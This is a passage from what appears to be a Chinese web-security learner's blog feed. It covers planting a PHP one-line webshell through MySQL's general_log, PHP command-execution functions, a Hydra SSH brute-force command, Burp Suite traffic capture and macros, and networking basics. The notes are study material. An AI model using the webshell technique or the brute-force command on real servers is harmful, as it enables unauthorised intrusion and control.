结尾的文件</p><p>general log   OFF -&gt; ON   打开日志功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW MASTER LOGS;</span><br><span class="line">SET GLOBAL general_log = &apos;ON&apos;</span><br><span class="line">SET GLOBAL general_log_file = &apos;C:/phpStudy/PHPTutorial/WWW/404.php&apos;</span><br></pre></td></tr></table></figure><p>执行任意 sql 语句，就能把内容存到 .php 结尾的文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&quot;pass&quot;])?&gt;&quot;</span><br></pre></td></tr></table></figure><p>除了 <code>&lt;?php ?&gt;</code> 其他均解析为 html</p><p>php 的短标签：</p><ul><li><? php ?></li><li><p>&lt;% %&gt;</p></li><li><? ?></li><li><script language="php"> </script></li></ul><h3 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h3><h4 id="执行-PHP-代码："><a href="#执行-PHP-代码：" class="headerlink" title="执行 PHP 代码："></a>执行 PHP 代码：</h4><p>​    eval(), assert()</p><h4 id="执行系统命令："><a href="#执行系统命令：" class="headerlink" title="执行系统命令："></a>执行系统命令：</h4><pre><code>* system() 输出并返回最后一行 shell 结果* exec() 不输出结果，返回最后一行 shell 结果，所有结果可以保存一个返回的数组里面* passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上* popen()* shell_exec()* proc_open()* pcntl_exec()</code></pre><p>反引号 ` 这个实际上使用的是 shell_exec</p><h4 id="exec-函数"><a href="#exec-函数" class="headerlink" title="exec()函数"></a>exec()函数</h4><p>exec函数，执行外部程序，不直接显示输出，只显示最后一行结果，一般把结果输出到数组中保存。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"ipconfig"</span>, $output);l</span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="number">1</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>执行外部程序，不直接显示输出，与 shell_exec() 函数等同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> `ipconfig`;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/ref.exec.php" target="_blank" rel="noopener">更多函数</a></p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>shell 是系统的用户界面，提供了用户与内核进行交互操作的一种接口。</p><h4 id="什么是-webshell"><a href="#什么是-webshell" class="headerlink" title="什么是 webshell"></a>什么是 webshell</h4><p>黑客在入侵了一个网站后，通常会留下一个 asp、aspx、jsp、php 等脚本后门文件与网站 web 服务器进行交互，得到了一个命令执行环境，以达到控制网站服务器的目的，这个后门文件就是所谓的 webshell。</p><h4 id="一句话木马介绍"><a href="#一句话木马介绍" class="headerlink" title="一句话木马介绍"></a>一句话木马介绍</h4><p>一句话木马是 webshell 的一种，由与这类 webshell 代码比较少，往往只有一行代码，所以就被称为一句话木马。</p><p>一句话木马虽然代码简单，但结合中国菜刀等 webshell 管理工具，它们的功能确实非常强大的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="webshell" scheme="http://yoursite.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>note30</title>
    <link href="http://yoursite.com/2019/08/24/note30/"/>
    <id>http://yoursite.com/2019/08/24/note30/</id>
    <published>2019-08-24T05:47:18.000Z</published>
    <updated>2019-08-24T08:11:44.728Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 使用 <code>burpsuite</code> 抓取手机数据包，以及本周疑难点总结</p><a id="more"></a><!--export--><!--toc--><h3 id="利用burpsuite抓取手机数据包"><a href="#利用burpsuite抓取手机数据包" class="headerlink" title="利用burpsuite抓取手机数据包"></a>利用burpsuite抓取手机数据包</h3><h4 id="手机和电脑连接同一网络"><a href="#手机和电脑连接同一网络" class="headerlink" title="手机和电脑连接同一网络"></a>手机和电脑连接同一网络</h4><p>查看电脑 <code>IP</code> </p><p><img src="/images/83ip.png" alt> </p><h4 id="配置burpsuite和手机代理"><a href="#配置burpsuite和手机代理" class="headerlink" title="配置burpsuite和手机代理"></a>配置burpsuite和手机代理</h4><p><strong>burpsuite</strong>:</p><p><img src="/images/84bpTel3.png" alt></p><p>在 <code>Proxy</code> 中选择 <code>Options</code> 点击 <code>Add</code>，绑定端口填入 <code>8080</code> ，<code>Specific address</code>选择第一步查看到的 <code>IP</code>，配置完后点击 <code>Import/export CA certificate</code>。</p><p><strong>手机代理</strong>：</p><p>长按连接的 <code>wifi</code>，选择显示高级选项，代理选择 <code>手动</code> ，主机名填写 第一步的 <code>IP</code>，端口号 <code>8080</code>，<code>IP</code> 设置选择 <code>DHCP</code> </p><h4 id="下载证书并导入手机"><a href="#下载证书并导入手机" class="headerlink" title="下载证书并导入手机"></a>下载证书并导入手机</h4><p>打开手机浏览器，输入第一步的 <code>IP</code> 地址和端口号，会进入 <code>burpsuite</code> 证书下载界面，点击证书选择下载，若下载的是 <code>.cer</code>直接安装就好，若为 <code>.der</code>重命名为 <code>.cer</code>，点击安装后，证书名称输入 <code>CA</code>，凭据用途选择 <code>WLAN</code> 完成后就可以用 <code>burpsuite</code> 抓取手机数据包了。</p><p>在手机打开搜狐新闻抓取数据包如下：</p><p><img src="/images/85bpTel2.png" alt>  </p><p><img src="/images/86bpTel.png" alt></p><p>可以从 <code>User-Agent</code>看出手机型号。</p><h3 id="为什么三次握手？"><a href="#为什么三次握手？" class="headerlink" title="为什么三次握手？"></a>为什么三次握手？</h3><p>三次握手的作用是：通信双方能明确自己的收发以及对方的收发是正常的。</p><h4 id="第一次握手"><a href="#第一次握手" class="headerlink" title="第一次握手"></a>第一次握手</h4><p>客户端给服务端发送网络包，服务端接收到了数据包。对于服务端来说可以有以下结论：客户端的发送功能以及服务端的接收功能是正常的；对于客户端来说，无法得出结论。</p><h4 id="第二次握手"><a href="#第二次握手" class="headerlink" title="第二次握手"></a>第二次握手</h4><p>服务端发包，客户端接收。客户端接收包，对于客户端来说，首先接收到了包，说明第一次发送成功了，说明自己的收发没有问题，其次，也可以得出服务端的收发是没有问题的。即经过第二次握手后，客户端已经明确自己和对方的收发功能是否正常了。但，服务端目前还不能判断自己的发送和客户端的接收是否正常。</p><h4 id="第三次握手"><a href="#第三次握手" class="headerlink" title="第三次握手"></a>第三次握手</h4><p>客户端发包，服务端接收。前两次握手后，服务端无法明确客户端的接收和自己的发送能力是否正常。而第三次握手后，服务端收到了客户端对第二次握手作回应，对服务端来说，第二次握手响应数据发出后，客户端接收到了。所以我的发送能力是正常的，而客户端的接收能力也是正常的。</p><table><thead><tr><th>握手次数</th><th>客户端</th><th>服务端</th></tr></thead><tbody><tr><td>第一次</td><td>发数据</td><td>客户端发送能力正常，服务端的接收能力正常</td></tr><tr><td>第二次</td><td>客户端收发正常，服务端的收发正常</td><td>发数据</td></tr><tr><td>第三次</td><td>发数据</td><td>客户端收发正常，服务端收发正常</td></tr></tbody></table><p><em>参考文献</em></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/53374516" target="_blank" rel="noopener">“三次握手，四次挥手”你真的懂吗？</a></p></blockquote><h3 id="为什么建立连接是三次握手，而关闭连接却是四次挥手？"><a href="#为什么建立连接是三次握手，而关闭连接却是四次挥手？" class="headerlink" title="为什么建立连接是三次握手，而关闭连接却是四次挥手？"></a>为什么建立连接是三次握手，而关闭连接却是四次挥手？</h3><p>服务端在 <code>LISTEN</code> 状态下，收到建立连接请求的 <code>SYN</code> 报文后，把 <code>ACK</code> 和 <code>SYN</code> 放在一个报文里发送给客户端。而关闭连接时，当收到对方的 <code>FIN</code> 报文时，仅仅表示对方不再发送数据了，但还是可以接收数据 ，己方是否现在关闭发送通道，需要上层应用来决定，因此，己方的 <code>ACK</code> 和 <code>FIN</code> 一般都会分开发送。</p><p><img src="/images/87fourbai.gif" alt></p><p><em>参考文献</em></p><blockquote><p><a href="https://blog.csdn.net/qzcsu/article/details/72861891" target="_blank" rel="noopener">图片来源</a></p><p><a href="https://zhuanlan.zhihu.com/p/53374516" target="_blank" rel="noopener">“三次握手，四次挥手”你真的懂吗？</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 使用 &lt;code&gt;burpsuite&lt;/code&gt; 抓取手机数据包，以及本周疑难点总结&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="burpsuite" scheme="http://yoursite.com/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>note29</title>
    <link href="http://yoursite.com/2019/08/23/note29/"/>
    <id>http://yoursite.com/2019/08/23/note29/</id>
    <published>2019-08-23T10:51:36.000Z</published>
    <updated>2019-08-23T12:28:26.424Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 学习网络层数据包的结构， <code>ARP</code> 协议、<code>IP</code> 协议和 <code>ICMP</code> 协议以及 <code>wireshark</code> 获取网络层的数据包。</p><a id="more"></a><!--export--><!--toc--><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><h4 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h4><ul><li>熟悉网络层数据包结构</li><li>熟悉<code>ARP</code> 协议、<code>IP</code> 协议、<code>ICMP</code> 协议</li><li>能够看懂 <code>wireshark</code>获取到的网络层数据包 </li></ul><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h4><h5 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h5><p><code>ARP</code>: <code>Address Resolution Protocol</code> 协议，即地址解析协议，把网络层的 <code>IP</code> 地址翻译成在数据链路层寻址的48位硬件地址（<code>MAC</code>地址）。</p><p>在 <code>OSI</code> 模型中 <code>ARP</code> 协议属于链路层；在 <code>TCP/IP</code> 模型中，<code>ARP</code> 协议属于网络层。</p><h5 id="ARP协议工作流程"><a href="#ARP协议工作流程" class="headerlink" title="ARP协议工作流程"></a>ARP协议工作流程</h5><p><strong>第一步</strong>：在每台主机都设有一个 <code>ARP</code> 高速缓存，保存局域网上各主机和路由 <code>IP</code> 地址到硬件地址的映射表。当 <code>A</code>主机向 <code>B</code>主机发送一个数据包时，<code>A</code> 主机先在其高速缓存中查看有无 <code>B</code> 的 <code>IP</code> 地址对应的 <code>MAC</code>地址，如果有把硬件地址写入到数据包。</p><p><strong>第二步</strong>：若没有找到，<code>APR</code> 进程在局域网上广播发送一个 <code>ARP</code> 请求分组，数据包的主要内容是：“我的 <code>IP</code> 值是<code>1.1.1.1</code>，硬件地址是 <code>xx-xx-xx-xx-xx-xx-xx-xx</code>。我想知道<code>IP</code>地址为 <code>2.2.2.2</code> 的主机硬件地址”，局域网上所有主机上都会收到这个 <code>ARP</code> 请求分组。</p><p><strong>第三步</strong>：主机 <code>B</code> 收到了主机 <code>A</code> 发送的 <code>ARP</code> 请求分组数据包，发现请求的 <code>IP</code> 和自己的 <code>IP</code> 一样，就收下这个 <code>IP</code>，并向主机<code>A</code>发送 <code>ARP</code> 响应分组，同时把数据包带有 <code>A</code> 的硬件地址写入自己的 <code>ARP</code> 缓存表。其余所有的主机因为 <code>IP</code> 不匹配都不会理会这个请求数据包。响应包的主要内容是：“我的 <code>IP</code> 地址是 <code>2.2.2.2</code>，我的硬件地址是 <code>yy-yy-yy-yy-yy-yy-yy-yy</code>”，单独发送给 <code>A</code>，不会广播。</p><p><strong>Note</strong>: <code>ARP</code> 对保存在高速缓存中的每一个映射地址都设置生存时间，超过生存时间就会从缓存表中删除，防止对方硬件地址突然失效，比如拔下网线，更换网卡；当硬件地址发生变化，主机会发送一个无偿的 <code>ARP</code> 数据包，广播给局域网内所有鸡器。</p><h4 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h4><p><code>IP</code> 在 <code>ARP</code> 的上层，<code>ICMP</code> 和 <code>IGMP</code>在 <code>IP</code> 的上层。</p><p><img src="/images/78ip.png" alt></p><p><img src="/images/79ipprotocol.png" alt></p><h4 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h4><h5 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h5><p><code>ICMP</code>: <code>Internet Control Message Protocol</code> ，即网际报文控制协议。用于在<code>IP</code> 主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。大部分网络检修技巧和工具都是基于<code>ICMP</code>的。简单点说，<code>ICMP</code>常用于寻找网络故障。</p><h5 id="tracert工作原理"><a href="#tracert工作原理" class="headerlink" title="tracert工作原理"></a>tracert工作原理</h5><p><code>tracert</code> 从源主机向目的主机发送一连串 <code>ICMP</code> 数据包。第一个数据包 <code>P1</code> 的生存时间 <code>TTL=1</code>，当 <code>P1</code> 数据包到达路径上第一个路由器 <code>R1</code> 时候，路由器把 <code>TTL</code> 减一，然后发现 <code>TTL=0</code>，<code>R1</code>就丢弃 <code>P1</code>，然后发送一个 <code>ICMP</code>时间超过差错报文。下一个数据包 <code>TTL=2</code>，到第二个路由器 <code>R2</code>被丢弃，以此类推。</p><p>当 <code>TTL</code> 等于某一个数值时候，刚好到达目的主机，目的主机就返回一个正常的响应包，告诉源主机已经到达目的主机。</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>在网络中进行通信的实体是主机中的进程，网络层为主机之间提供逻辑通信，而传输层为应用进程之间提供端到端的逻辑通信。传输层还要对报文进行差错检测，提供可靠的运输。但在网络层，<code>IP</code> 数据包检测只针对首部，不检查数据部分。</p><p>传输层的两个主要协议：</p><pre><code>* 传输控制协议 `TCP` (`Transmission Control Protocol`)* 用户数据包协议`UDP` (`User Datagram Protocol`)</code></pre><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><ol><li><code>TCP</code> 提供面向连接的服务。在传送数据前必须先建立会话，进行流量控制，保证可靠传输。</li><li><code>UDP</code> 传输之间不需要建立连接，不提供可靠交付，简单点说就是发送出去就不管了。适合一个数据包就能完成通信，或者对丢包了没必要重传的应用。</li></ol><p><img src="/images/80tcpudp.png" alt></p><h4 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h4><h5 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h5><p><img src="/images/81threehands.png" alt></p><ol><li>客户端发送 <code>SYN</code> 段，并指明客户端的初始化序列号，即 <code>ISN(s)</code></li><li>服务端发送自己的 <code>SYN</code>段作为应答，同样指明自己的 <code>ISN(s)</code> 。为了确认客户端的 <code>SYN</code>，将 <code>ISN(c)+1</code> 作为 <code>ACK</code> 数值。这样，每发送一个 <code>SYN</code>，序列号就会加1。如果有丢失情况，则会重传。</li><li>为了确认服务器端的 <code>SYN</code>，客户端将 <code>SYN(s)+1</code>作为返回的 <code>ACK</code>数值。</li></ol><h5 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h5><p><img src="/images/82foursaybai.png" alt></p><ol><li>客户端发送一个 <code>FIN</code> 段，并包含一个希望接受这看到的自己当前的序列号 <code>K</code>，同时还包含一个 <code>ACK</code> 表示确认对方最近一次发过来的数据。</li><li>服务端将 <code>K</code>值加1作为 <code>ACK</code> 序号值，表明收到了上一个包。这是上层应用程序会被告知另一端发起了关闭操作，通常将这引起应用程序发起自己的关闭。</li><li>服务端发起自己的 <code>FIN</code> 段， <code>ACK=K+1</code>，<code>Seq=L</code> 。</li><li>客户端确认，<code>ACK=L+1</code></li></ol><h4 id="DNS域名解析"><a href="#DNS域名解析" class="headerlink" title="DNS域名解析"></a>DNS域名解析</h4><h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><ol><li>浏览器输入 <code>www.xxx.com</code> 域名，操作系统会检查自己本地的 <code>hosts</code> 文件是否有这个映射关系，若有，就先调用这个 <code>IP</code> 地址映射，完成域名解析。</li><li>若 <code>hosts</code> 没有这个域名映射，则查找本地 <code>DNS</code> 解析器缓存，是否有这个网址映射关系，若有直接返回，完成域名解析。</li><li>若 <code>hosts</code> 与本地 <code>DNS</code> 解析器缓存都没有相应的网址映射关系，首先会找 <code>TCP/IP</code> 参数设置的首选 <code>DNS</code> 服务器，即本地 <code>DNS</code> 服务器，此服务器收到查询时，若要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析。</li><li>若本地 <code>DNS</code> 服务器解析失败，则到根 <code>DNS</code> 解析器请求。</li></ol><h4 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h4><p><code>DHCP</code>: <code>Dynamic Host Configuration Protocol</code>，即动态主机配置协议，是一个应用层协议，工作在局域网，使用 <code>UDP</code> 协议，能够让设备自动获取重要网络资源，本质就是在 <code>DHCP</code> 服务器上有一个数据库，存放着 <code>IP</code>地址、网关、<code>DNS</code>等参数。</p><h5 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h5><ol><li>自动分配方式：<code>DHCP</code>给主机指定一个永久的 <code>IP</code> 地址，一旦 <code>DHCP</code> 客户端第一次成功的从 <code>DHCP</code> 服务器租用到 <code>IP</code>位址后，就永远使用这个位址。</li><li>动态分配方式：<code>DHCP</code> 给主机指定一个有”时间限制”的 <code>IP</code> 地址，到时间或主机明确表示放弃这个地址时，这个地址可以被其他主机使用，当然，客户端可以比其他主机更优先延续租用。</li><li>手动分配方式：主机 <code>IP</code> 地址由网络管理员指定，它可以按照 <code>MAC</code>地址固定分配 <code>IP</code> 位址，<code>DHCP</code> 只是把指定的 <code>IP</code> 地址告诉主机，相当于将某个 <code>MAC</code> 和 <code>IP</code> 进行了静态绑定。</li></ol><h5 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h5><ol><li>新机器加入网络时，会使用 <code>0.0.0.0</code> 作为源地址，发送广播<code>discover</code>报文，查询网络上有哪些 <code>DHCP server</code> </li><li><code>DHCP</code> 服务器接收到 <code>DHCP Discover</code> 报文后，回应 <code>Offer</code> 报文，提供 <code>IP</code> 地址给请求方</li><li>请求方根据收到的 <code>Offer</code> 报文，选择一个 <code>DHCP server</code> ，并选择它提供的 <code>IP</code> 地址，然后广播 <code>Request</code> 报文，向 <code>DHCP Server</code> 请求该 <code>IP</code> 地址，同时想本地网络公告自己已经选择了某个 <code>DHCP Server</code> 的某个 <code>IP</code> 地址</li><li><code>DHCP Server</code> 回应 <code>ACK</code> 报文，将 <code>IP</code> 地址分配给 <code>Client</code> 端</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 学习网络层数据包的结构， &lt;code&gt;ARP&lt;/code&gt; 协议、&lt;code&gt;IP&lt;/code&gt; 协议和 &lt;code&gt;ICMP&lt;/code&gt; 协议以及 &lt;code&gt;wireshark&lt;/code&gt; 获取网络层的数据包。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>note28</title>
    <link href="http://yoursite.com/2019/08/22/note28/"/>
    <id>http://yoursite.com/2019/08/22/note28/</id>
    <published>2019-08-22T12:11:37.000Z</published>
    <updated>2019-08-22T12:41:44.698Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>hadra</code> 的使用及计算机网络基础</p><a id="more"></a><!--export--><!--toc--><h3 id="Hadra的使用"><a href="#Hadra的使用" class="headerlink" title="Hadra的使用"></a>Hadra的使用</h3><table><thead><tr><th>参数</th><th>用法</th></tr></thead><tbody><tr><td>-l LOGIN</td><td>指定破解的用户，对特定用户破解</td></tr><tr><td>-L FILE</td><td>指定用户名字典</td></tr><tr><td>-p PASS</td><td>小写，指定密码破解</td></tr><tr><td>-P FILE</td><td>大写，指定密码字典</td></tr><tr><td>-M FILE</td><td>指定目标列表文件一行一条</td></tr><tr><td>-t TASKS</td><td>同时运行的线程数</td></tr></tbody></table><p>实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l username -P password.txt -t 6 ssh://ip</span><br></pre></td></tr></table></figure><p>在物理机上用 <code>ssh</code> 连接 <code>VM</code> 的 <code>CentOS</code> ，</p><p><img src="/images/73powershell.png" alt> </p><p>然后在 <code>Kali</code> 用 <code>hydra</code> 破解密码。</p><p><img src="/images/74hydra.png" alt></p><h3 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h3><h4 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h4><ul><li>了解常见的网络设备</li><li>了解三种网络模型</li><li>了解互联网中数据传输方式</li><li>深入理解网络层协议</li><li>深入理解运输层协议</li><li>深入理解应用层协议</li></ul><h4 id="认识网络设备"><a href="#认识网络设备" class="headerlink" title="认识网络设备"></a>认识网络设备</h4><p>网卡：允许计算机在计算机网络上进行通讯的计算机硬件，拥有 <code>MAC</code> 地址，属于 <code>OSI</code> 模型第一层。</p><p><strong>修改 <code>MAC</code>地址</strong>： 设备管理器 → 网络适配器 → 选择网卡 → 网络连接 → 修改</p><p>集线器：工作与 <code>OSI</code> 模型第一层，属于纯硬件网络底层设备，发送数据没有针对性，采用广播方式发送。</p><p>交换机：工作与 <code>OSI</code> 模型第二层，具有”智能记忆“能力和”学习“能力，使用 <code>MAC</code> 来寻址。</p><p>路由器：连接两个或多个网络的硬件设备，在网络间起网卡的作用，运行在 <code>OSI</code> 模型第三层，使用 <code>IP</code> 地址来通信。</p><h4 id="OSI网络分层"><a href="#OSI网络分层" class="headerlink" title="OSI网络分层"></a>OSI网络分层</h4><p>参见<a href="https://meethanmj.github.io/2019/08/20/note26/" target="_blank" rel="noopener">note26</a></p><h4 id="数据传输过程"><a href="#数据传输过程" class="headerlink" title="数据传输过程"></a>数据传输过程</h4><p><img src="/images/77data_how_to_tran.png" alt></p><h4 id="数据封装过程"><a href="#数据封装过程" class="headerlink" title="数据封装过程"></a>数据封装过程</h4><p><img src="/images/75package.png" alt></p><h4 id="数据解封过程"><a href="#数据解封过程" class="headerlink" title="数据解封过程"></a>数据解封过程</h4><p><img src="/images/76unpackage.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: &lt;code&gt;hadra&lt;/code&gt; 的使用及计算机网络基础&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite</title>
    <link href="http://yoursite.com/2019/08/22/burpsuite/"/>
    <id>http://yoursite.com/2019/08/22/burpsuite/</id>
    <published>2019-08-22T00:23:04.000Z</published>
    <updated>2019-08-22T14:39:05.688Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 在 <code>Web</code> 应用的安全测试或扫描中，长时间无操作或意外出发 <code>logout</code> ，均会导致会话失效，访问请求跳到登录页面，需要再次登录，手工登录会有一些繁琐，其实完全可以使用 <code>Burpsuite</code> 的宏在会话失效后完成自动登录。</p><a id="more"></a><!--export--><!--toc--><h3 id="使用宏维持会话有效"><a href="#使用宏维持会话有效" class="headerlink" title="使用宏维持会话有效"></a>使用宏维持会话有效</h3><h4 id="分析登录过程"><a href="#分析登录过程" class="headerlink" title="分析登录过程"></a>分析登录过程</h4><p>在 <code>Firefox</code> 浏览器中登录 <code>DVWA</code> 后，点击 <code>Logout</code> 退出登录，然后在重新登录，用 <code>Burpsuite</code> 分析登录过程。登陆退出后，页面跳转到 <code>login.php</code> , 服务器响应内容中包含 <code>user_token</code>。重新执行登录时，登录请求包含上一次得到的 <code>user_token</code>。登录成功后，服务响应 <code>302</code> ，跳转到 <code>index.php</code>。</p><h4 id="创建用户登录宏"><a href="#创建用户登录宏" class="headerlink" title="创建用户登录宏"></a>创建用户登录宏</h4><p>理清登录流程后，根据这个流程创建一个用户登录的宏。账号重新登录时，需要两个动作，第一个是 <code>GET</code> 请求 <code>login.php</code> 页面，获取 <code>user_token</code> ，下一个动作是发现账号、密码和 <code>user_token</code> 进行登录。在录制宏选项中，按住<code>Ctrl</code>，选择两个请求。第一个动作的 <code>GET</code> 请求，与前面的 <code>CSRF</code> 绕过的配置一样，选择 <code>user_token</code> 位置，添加变量。第二个动作，<code>POST</code> 请求的几个参数，<code>username</code>、<code>password</code>、<code>Login</code>都保持不变，<code>user_token</code>使用宏里上一次请求的参数返回值。完成后保持宏，命名为<code>user_Login</code>。</p><h4 id="创建会话处理规则"><a href="#创建会话处理规则" class="headerlink" title="创建会话处理规则"></a>创建会话处理规则</h4><p>添加一条新规则，规则描述为 <code>User_Login</code>，添加规则动作，选择 <code>Check session is valid</code>，验证会话是否有效。设置判断会话是否失效的标志和会话失效后的操作，会话失效后，运行之前的登录宏，从宏的请求响应中更新参数值。<code>Tools Scope</code>选择上 <code>Proxy</code>，<code>URL Scope</code>添加整个 <code>DVWA</code>路径。</p><h4 id="验证规则有效性"><a href="#验证规则有效性" class="headerlink" title="验证规则有效性"></a>验证规则有效性</h4><p>浏览器清除所有的 <code>Cookie</code>，输入 <code>DVWA</code> 地址，<code>Burpsuite</code> 宏自动登录网站，浏览器页面不会跳转到登录页面，而是直接进入主界面。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 在 &lt;code&gt;Web&lt;/code&gt; 应用的安全测试或扫描中，长时间无操作或意外出发 &lt;code&gt;logout&lt;/code&gt; ，均会导致会话失效，访问请求跳到登录页面，需要再次登录，手工登录会有一些繁琐，其实完全可以使用 &lt;code&gt;Burpsuite&lt;/code&gt; 的宏在会话失效后完成自动登录。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="BurpSuite" scheme="http://yoursite.com/tags/BurpSuite/"/>
    
  </entry>
  
  <entry>
    <title>note27</title>
    <link href="http://yoursite.com/2019/08/21/note27/"/>
    <id>http://yoursite.com/2019/08/21/note27/</id>
    <published>2019-08-21T10:46:10.000Z</published>
    <updated>2019-08-21T14:46:30.957Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>HTTP</code> 内容总结，及 <code>burpsuite</code> 软件的使用</p><a id="more"></a><!--export--><!--toc--><h3 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>无连接：限制每次连接只处理一个请求。服务器处理完客户的请求，并受到客户的应答后，即断开连接。以节省时间。</li><li>无状态：协议对于事物处理没有记忆能力，若后续处理前面的信息，则它必须重传。</li></ul><h4 id="HTTP之URL"><a href="#HTTP之URL" class="headerlink" title="HTTP之URL"></a>HTTP之URL</h4><p><code>URI</code> 是统一资源标识符，用来传输数据和建立连接。 <code>URL</code> 是一种特殊类型的 <code>URI</code> ，包含用于查找某个资源足够的信息。</p><p><code>URL</code> 是统一资源定位符，是互联网上用来标识某处资源的地址。</p><p><code>URL</code> 协议部分 域名部分 端口部分 虚拟目录部分 文件名部分 锚部分 参数部分</p><h4 id="HTTP请求和响应"><a href="#HTTP请求和响应" class="headerlink" title="HTTP请求和响应"></a>HTTP请求和响应</h4><p>请求消息：请求行、请求头部、空行和请求数据四部分组成。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/562f25980001b1b106000338.jpg</span> HTTP/1.1</span><br><span class="line">Host    img.mukewang.com</span><br><span class="line">User-Agent  Mozilla/5.0 (Windows NT 